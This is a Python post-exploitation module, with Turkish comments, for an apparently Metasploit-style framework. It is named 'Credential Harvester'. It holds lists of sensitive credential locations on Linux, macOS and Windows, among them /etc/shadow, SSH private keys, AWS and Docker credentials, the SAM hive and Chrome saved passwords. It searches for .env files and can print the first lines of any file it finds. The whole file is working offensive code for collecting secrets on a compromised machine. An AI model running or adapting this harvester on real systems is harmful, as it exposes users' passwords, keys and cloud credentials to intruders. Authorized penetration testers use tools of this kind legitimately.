# =============================================================================
# Post-Exploitation: Credential Harvester
# =============================================================================
# Hedef sistemdeki yaygın kimlik bilgisi dosyalarını tarayan ve
# bulunan hassas verileri raporlayan modül.
#
# KULLANIM:
#   1. use post/gather/credentials
#   2. set TARGET_DIR /home
#   3. set SEARCH_DEPTH 3
#   4. set SHOW_CONTENT false
#   5. run
# =============================================================================

import contextlib
import os
import sys
from typing import Any

from rich.console import Console
from rich.panel import Panel
from rich.table import Table

from core import logger
from core.module import BaseModule
from core.option import Option

# ── Bilinen hassas dosya desenleri ───────────────────────────────────────────

CREDENTIAL_PATTERNS: dict[str, list[dict[str, str]]] = {
    "linux": [
        {"path": "/etc/shadow", "desc": "Sistem kullanıcı parola hash'leri"},
        {"path": "/etc/passwd", "desc": "Kullanıcı hesap bilgileri"},
        {"path": "~/.bash_history", "desc": "Bash komut geçmişi"},
        {"path": "~/.zsh_history", "desc": "Zsh komut geçmişi"},
        {"path": "~/.ssh/id_rsa", "desc": "SSH özel anahtarı (RSA)"},
        {"path": "~/.ssh/id_ed25519", "desc": "SSH özel anahtarı (Ed25519)"},
        {"path": "~/.ssh/authorized_keys", "desc": "Yetkili SSH anahtarları"},
        {"path": "~/.ssh/known_hosts", "desc": "Bilinen SSH sunucuları"},
        {"path": "~/.netrc", "desc": "FTP/HTTP otomatik giriş bilgileri"},
        {"path": "~/.pgpass", "desc": "PostgreSQL parola dosyası"},
        {"path": "~/.my.cnf", "desc": "MySQL istemci yapılandırması"},
        {"path": "~/.aws/credentials", "desc": "AWS erişim anahtarları"},
        {"path": "~/.aws/config", "desc": "AWS yapılandırması"},
        {"path": "~/.docker/config.json", "desc": "Docker registry kimlik bilgileri"},
        {"path": "~/.git-credentials", "desc": "Git kimlik bilgileri"},
        {"path": "~/.config/gcloud/credentials.db", "desc": "GCloud kimlik bilgileri"},
    ],
    "darwin": [
        {"path": "~/.bash_history", "desc": "Bash komut geçmişi"},
        {"path": "~/.zsh_history", "desc": "Zsh komut geçmişi"},
        {"path": "~/.ssh/id_rsa", "desc": "SSH özel anahtarı (RSA)"},
        {"path": "~/.ssh/id_ed25519", "desc": "SSH özel anahtarı (Ed25519)"},
        {"path": "~/.ssh/authorized_keys", "desc": "Yetkili SSH anahtarları"},
        {"path": "~/.netrc", "desc": "FTP/HTTP otomatik giriş bilgileri"},
        {"path": "~/.aws/credentials", "desc": "AWS erişim anahtarları"},
        {"path": "~/.docker/config.json", "desc": "Docker registry kimlik bilgileri"},
        {"path": "~/.git-credentials", "desc": "Git kimlik bilgileri"},
    ],
    "win32": [
        {
            "path": r"C:\Windows\System32\config\SAM",
            "desc": "SAM veritabanı (parola hash'leri)",
        },
        {"path": r"C:\Windows\System32\config\SYSTEM", "desc": "SYSTEM registry hive"},
        {"path": r"%USERPROFILE%\.ssh\id_rsa", "desc": "SSH özel anahtarı"},
        {
            "path": r"%APPDATA%\FileZilla\recentservers.xml",
            "desc": "FileZilla kayıtlı sunucular",
        },
        {
            "path": r"%APPDATA%\FileZilla\sitemanager.xml",
            "desc": "FileZilla site yöneticisi",
        },
        {
            "path": r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data",
            "desc": "Chrome kayıtlı şifreler (SQLite)",
        },
    ],
}

# .env dosyası desenleri (tüm platformlarda aranır)
ENV_FILE_PATTERNS = [".env", ".env.local", ".env.production", ".env.development"]


class credentials(BaseModule):
    """Hedef Sistemde Kimlik Bilgisi Avcısı (Post-Exploitation)

    Bilinen konumlardaki hassas dosyaları tarar ve erişilebilirlik durumunu
    raporlar. İsteğe bağlı olarak dosya içeriğinin ilk satırlarını gösterir.
    """

    # ── META ──────────────────────────────────────────────────────────────────
    Name = "Credential Harvester"
    Description = "Hedef sistemdeki kimlik bilgisi dosyalarını tarar ve raporlar"
    Author = "Mahmut P."
    Category = "post/gather"
    Version = "1.0"

    Requirements: dict[str, list[str]] = {}

    def __init__(self):
        super().__init__()
        self.Options = {
            "TARGET_DIR": Option(
                name="TARGET_DIR",
                value="/",
                required=False,
                description="Ek .env dosya araması için kök dizin",
            ),
            "SEARCH_DEPTH": Option(
                name="SEARCH_DEPTH",
                value=3,
                required=False,
                description=".env araması için maksimum dizin derinliği",
                regex_check=True,
                regex=r"^\d+$",
            ),
            "SHOW_CONTENT": Option(
                name="SHOW_CONTENT",
                value="false",
                required=False,
                description="Bulunan dosyaların ilk satırlarını göster (true/false)",
                choices=["true", "false"],
            ),
            "PREVIEW_LINES": Option(
                name="PREVIEW_LINES",
                value=5,
                required=False,
                description="SHOW_CONTENT=true ise gösterilecek satır sayısı",
                regex_check=True,
                regex=r"^\d+$",
            ),
        }
        for opt_name, opt_obj in self.Options.items():
            setattr(self, opt_name, opt_obj.value)

        self.console = Console()

    # ── YARDIMCI ─────────────────────────────────────────────────────────────

    @staticmethod
    def _expand_path(path: str) -> str:
        """~ ve %ENV% yer tutucularını genişletir."""
        return os.path.expandvars(os.path.expanduser(path))

    @staticmethod
    def _read_preview(filepath: str, max_lines: int = 5) -> list[str]:
        """Dosyanın ilk N satırını okur; binary ise atlar."""
        lines: list[str] = []
        try:
            with open(filepath, errors="replace") as fh:
                for i, line in enumerate(fh):
                    if i >= max_lines:
                        break
                    lines.append(line.rstrip("\n\r"))
        except Exception:
            lines.append("[Okunamadı]")
        return lines

    def _check_known_files(self) -> list[tuple[str, str, bool, int]]:
        """Platforma göre bilinen hassas dosyaları kontrol eder.

        Returns:
            [(abs_path, description, exists, size_bytes), ...]
        """
        plat = (
            "win32"
            if sys.platform == "win32"
            else ("darwin" if sys.platform == "darwin" else "linux")
        )
        patterns = CREDENTIAL_PATTERNS.get(plat, CREDENTIAL_PATTERNS["linux"])
        results: list[tuple[str, str, bool, int]] = []

        for entry in patterns:
            abs_path = self._expand_path(entry["path"])
            exists = os.path.isfile(abs_path)
            size = 0
            if exists:
                with contextlib.suppress(OSError):
                    size = os.path.getsize(abs_path)
            results.append((abs_path, entry["desc"], exists, size))
        return results

    def _find_env_files(self, root_dir: str, max_depth: int) -> list[str]:
        """Belirtilen dizinde .env dosyalarını arar."""
        found: list[str] = []
        root_dir = os.path.abspath(root_dir)
        root_depth = root_dir.rstrip(os.sep).count(os.sep)

        try:
            for dirpath, dirnames, filenames in os.walk(root_dir):
                current_depth = dirpath.rstrip(os.sep).count(os.sep) - root_depth
                if current_depth >= max_depth:
                    dirnames.clear()
                    continue
                # Gizli/sistem dizinlerini atla
                dirnames[:] = [
                    d
                    for d in dirnames
                    if not d.startswith(".")
                    and d not in ("node_modules", "venv", "__pycache__", ".git")
                ]
                for fname in filenames:
                    if fname in ENV_FILE_PATTERNS:
                        found.append(os.path.join(dirpath, fname))
        except PermissionError:
            pass

        return found

    # ── RUN ──────────────────────────────────────────────────────────────────

    def run(self, options: dict[str, Any]) -> bool:
        target_dir = str(options.get("TARGET_DIR", "/"))
        search_depth = int(options.get("SEARCH_DEPTH", 3))
        show_content = str(options.get("SHOW_CONTENT", "false")).lower() == "true"
        preview_lines = int(options.get("PREVIEW_LINES", 5))

        logger.info("Kimlik bilgisi taraması başlatıldı")

        self.console.print()
        self.console.print(
            Panel.fit(
                "[bold cyan]🔑 KİMLİK BİLGİSİ TARAMASI — Post-Exploitation[/bold cyan]",
                border_style="cyan",
            )
        )

        # ── 1. Bilinen Hassas Dosyalar ────────────────────────────────────
        known = self._check_known_files()
        found_count = sum(1 for _, _, exists, _ in known if exists)

        tbl = Table(title="📂 Bilinen Hassas Dosyalar", border_style="red")
        tbl.add_column("Durum", justify="center", width=6)
        tbl.add_column("Dosya Yolu", style="white", max_width=55)
        tbl.add_column("Açıklama", style="dim")
        tbl.add_column("Boyut", justify="right")

        for abs_path, desc, exists, size in known:
            if exists:
                status = "[green]✔[/green]"
                size_str = f"{size:,} B" if size < 1024 else f"{size / 1024:.1f} KB"
            else:
                status = "[dim]✘[/dim]"
                size_str = "-"
            tbl.add_row(status, abs_path, desc, size_str)

        self.console.print(tbl)
        self.console.print(
            f"  [bold]Bulunan:[/bold] [green]{found_count}[/green] / {len(known)}"
        )
        self.console.print()

        # ── İçerik Ön İzleme ──────────────────────────────────────────────
        if show_content and found_count > 0:
            for abs_path, desc, exists, size in known:
                if not exists:
                    continue
                lines = self._read_preview(abs_path, preview_lines)
                self.console.print(
                    Panel(
                        "\n".join(lines) if lines else "[dim]Boş dosya[/dim]",
                        title=f"[cyan]{abs_path}[/cyan]",
                        border_style="yellow",
                        expand=False,
                    )
                )
            self.console.print()

        # ── 2. .env Dosyaları ─────────────────────────────────────────────
        self.console.print(
            f"[bold cyan][*] {target_dir} altında .env dosyaları aranıyor "
            f"(derinlik: {search_depth})...[/bold cyan]"
        )
        env_files = self._find_env_files(target_dir, search_depth)

        if env_files:
            tbl = Table(title="📄 Bulunan .env Dosyaları", border_style="yellow")
            tbl.add_column("#", style="dim", justify="right")
            tbl.add_column("Dosya Yolu", style="white")
            tbl.add_column("Boyut", justify="right")

            for idx, fpath in enumerate(env_files, 1):
                try:
                    fsize = os.path.getsize(fpath)
                    size_str = (
                        f"{fsize:,} B" if fsize < 1024 else f"{fsize / 1024:.1f} KB"
                    )
                except OSError:
                    size_str = "?"
                tbl.add_row(str(idx), fpath, size_str)

            self.console.print(tbl)
            self.console.print(
                f"  [bold]Toplam:[/bold] [yellow]{len(env_files)}[/yellow] .env dosyası"
            )

            if show_content:
                for fpath in env_files[:10]:  # En fazla 10 tanesini göster
                    lines = self._read_preview(fpath, preview_lines)
                    self.console.print(
                        Panel(
                            "\n".join(lines) if lines else "[dim]Boş[/dim]",
                            title=f"[cyan]{fpath}[/cyan]",
                            border_style="yellow",
                            expand=False,
                        )
                    )
        else:
            self.console.print("[dim]  .env dosyası bulunamadı.[/dim]")

        self.console.print()
        logger.info("Kimlik bilgisi taraması tamamlandı")
        return True
